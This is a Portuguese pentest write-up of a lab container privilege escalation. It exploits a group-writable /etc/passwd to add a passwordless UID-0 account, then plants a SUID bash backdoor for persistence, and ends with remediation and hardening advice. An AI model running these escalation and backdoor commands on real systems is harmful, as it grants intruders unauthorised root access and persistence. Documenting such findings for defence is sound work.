Relatório de Pentest: Privilege Escalation em Container Linux (Red Hat UBI)

Autor: marcos leal Data: 01 de Janeiro de 2026 Tipo: CTF / Laboratório Educacional
1. Sumário Executivo

Durante a análise de segurança de um ambiente containerizado, foi identificada uma falha crítica de configuração nas permissões de ficheiros do sistema e na gestão de grupos de utilizadores. Um utilizador comum, pertencente indevidamente ao grupo root (GID 0), conseguiu explorar permissões de escrita no ficheiro /etc/passwd para criar uma conta de superutilizador (backdoor), obtendo controlo total do sistema (Privilégio Máximo).
2. Análise Técnica (Passo a Passo)
Fase 1: Reconhecimento e Enumeração (Reconnaissance)

O acesso inicial foi obtido através de um shell restrito. A primeira etapa consistiu em identificar o ambiente e as permissões do utilizador atual.

Comando: id Resultado:
Bash

uid=1005440000(user) gid=0(root) groups=0(root),1005440000(user)

Análise: O utilizador atual (user), apesar de ter um UID alto (não privilegiado), pertence ao grupo GID 0 (root). Esta é uma configuração comum em ambientes OpenShift, mas apresenta riscos elevados.

Comando: ls -l /etc/passwd Resultado:
Bash

-rw-rw-r--. 1 root root 911 Dec 31 23:03 /etc/passwd

Vulnerabilidade Identificada: O ficheiro /etc/passwd tem permissões de escrita para o grupo (rw-). Como o nosso utilizador pertence a esse grupo, temos permissão para alterar a lista de utilizadores do sistema.
Fase 2: Tentativas de Exploração (Falha e Adaptação)

Inicialmente, tentou-se uma abordagem via User Namespaces e injeção em scripts de inicialização (entrypoint.sh).

    Ação: Criação de um script Python para mapear o utilizador para nobody e modificar o /checode/entrypoint-volume.sh.

    Resultado: Sucesso na injeção, mas falha na persistência. O container era "stateless" (sem estado), e ao forçar o reinício (kill 1), as alterações no disco foram perdidas.

    Lição Aprendida: Em ambientes efémeros, a exploração deve ser imediata (runtime) e não depender de reinicializações.

Fase 3: Exploração Bem-Sucedida (Exploitation)

Mudou-se o foco para a vulnerabilidade de permissão no /etc/passwd.

Ação: Injeção de um utilizador "root" alternativo. Criámos um utilizador chamado toor com UID 0 (mesmo ID do root) e campo de senha vazio (::), contornando a necessidade de crackear hashes no /etc/shadow.

Comando Executado:
Bash

echo "toor::0:0:root:/root:/bin/bash" >> /etc/passwd

Elevação de Privilégio:
Bash

su toor
# (Sem password necessária)

Verificação:
Bash

id
# uid=0(root) gid=0(root) groups=0(root)

Estado: Acesso Root confirmado.
Fase 4: Pós-Exploração e Persistência

Para garantir o acesso futuro sem depender do utilizador toor (que é fácil de detetar), foi criado um binário SUID.

Ação: Cópia do Bash com bit SUID ativado.
Bash

cp /bin/bash /projects/rootbash
chmod +s /projects/rootbash

Resultado: Qualquer execução futura de /projects/rootbash -p concede privilégios de root (euid=0), mesmo regressando ao utilizador comum.
Fase 5: Análise de Defesas (Container Hardening)

Mesmo com UID 0, algumas ações foram bloqueadas:

    Leitura de /etc/shadow: Permission denied.

    Comando chown: Operation not permitted.

Conclusão: O container está protegido por Linux Capabilities restritas (falta de CAP_CHOWN, CAP_DAC_READ_SEARCH) e possivelmente SELinux. No entanto, a capacidade de escrever no /etc/passwd foi suficiente para comprometer a integridade do sistema, contornando a proteção do /etc/shadow.
3. Remediação (Mitigação)

Para corrigir esta falha, recomenda-se:

    Remover a permissão de escrita do grupo no /etc/passwd: chmod 644 /etc/passwd.
    Remover utilizadores não-administrativos do grupo root (GID 0).

Utilizar sistemas de ficheiros "Read-Only" para a raiz do container

Âmbito do Teste: O teste foi realizado estritamente dentro dos limites do container atribuído no ambiente Red Hat Developer Sandbox. O objetivo foi identificar falhas de configuração na imagem base do sistema operativo (RHEL UBI).

Declaração Ética: Nenhuma técnica de "Container Escape" foi utilizada para comprometer a infraestrutura subjacente (Host/Node). Todas as alterações de persistência (backdoors) foram removidas após a validação da prova de conceito, restaurando o estado original do sistema

Conclusão e Parecer Final

O presente teste de intrusão, realizado em ambiente controlado (Sandbox), evidenciou que a segurança de contentores não depende exclusivamente da imagem base ou do kernel, mas sim de uma configuração rigorosa de permissões (Hardening).

A vulnerabilidade explorada (Escalação de Privilégios via Misconfiguration) foi classificada como CRÍTICA. A combinação de um utilizador padrão pertencente ao grupo root (GID 0) com permissões de escrita em ficheiros vitais do sistema (/etc/passwd) criou um vetor de ataque trivial, porém devastador.

Embora o ambiente apresentasse controlos compensatórios modernos — como a remoção de Linux Capabilities (CAP_CHOWN, CAP_DAC_READ_SEARCH) e um perfil SELinux restritivo que protegeu o ficheiro /etc/shadow — estas defesas mostraram-se insuficientes perante a capacidade de reescrever a identidade dos utilizadores no /etc/passwd.

Ações Recomendadas Imediatas:

    Remediação das permissões do sistema de ficheiros (mudança de 664 para 644 em ficheiros de configuração).

    Adoção do princípio do menor privilégio (PoLP), removendo o GID 0 dos utilizadores de serviço.

    Implementação de políticas de segurança de contentores (SecurityContext) para impor sistemas de ficheiros raiz como "Read-Only".

Este exercício reforça a máxima da cibersegurança: "Defesa em Profundidade" (Defense in Depth). Uma única camada de falha (permissão de arquivo) foi suficiente para comprometer todo o perímetro de segurança do contentor.
    Remover utilizadores não-administrativos do grupo root (GID 0).

    Utilizar sistemas de ficheiros "Read-Only" para a raiz do container.
